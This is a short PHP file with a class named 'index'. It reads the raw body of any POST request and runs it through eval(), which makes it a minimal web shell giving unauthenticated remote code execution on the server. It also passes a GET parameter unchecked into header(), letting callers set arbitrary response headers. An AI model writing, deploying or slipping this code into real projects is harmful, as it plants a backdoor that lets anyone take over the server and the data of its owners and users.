<?php

class index
{
    protected array $query = [];
    protected string $code = '';
    public string $response_content_type = 'Content-Type:text/json';
    public function __construct()
    {
        if ($_GET['response_content_type'] ?? 0){
            $this->response_content_type = $_GET['response_content_type'];
        }
        //POST RAW
        if ($this->code == ''){
            $this->code = file_get_contents("php://input");
        }
    }

    public function handle(){
        return eval($this->code);
    }
}
$index = new index();
$index->handle();
header($index->response_content_type);
